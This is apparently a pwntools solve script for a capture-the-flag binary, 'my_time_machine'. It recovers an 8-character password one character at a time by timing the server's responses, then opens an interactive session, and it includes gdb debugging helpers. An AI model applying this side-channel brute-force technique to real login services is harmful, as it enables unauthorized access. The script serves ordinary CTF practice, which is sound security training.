from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'

TARGET = './my_time_machine.elf'
HOST = 'challenge.rgbsec.xyz'
PORT = 13373

elf = ELF(TARGET)
def start():
    if not args.R:
        print("local")
        return process(TARGET)
        # return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
        # return process(TARGET, stdout=process.PTY, stdin=process.PTY)
    else:
        print("remote")
        return remote(HOST, PORT)

def get_base_address(proc):
    return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(proc, breakpoints):
    script = "handle SIGALRM ignore\n"
    PIE = get_base_address(proc)
    script += "set $base = 0x{:x}\n".format(PIE)
    for bp in breakpoints:
        script += "b *0x%x\n"%(PIE+bp)
    script += "c"
    gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))

r = start()
if args.D:
    debug(r, [0x185e])
word = ''
context.timeout = 0
r.recvuntil('Password:')
while(len(word)<8):
    for i in range(26): 
        r.sendline((word + chr(0x41+i)).ljust(8, 'A'))
        ret = r.recvrepeat(0.5+len(word))
        if 'Enter' not in ret:
            break
    word += chr(0x41+i)
    context.timeout = len(word)
    log.info(word)

r.interactive()
r.close()
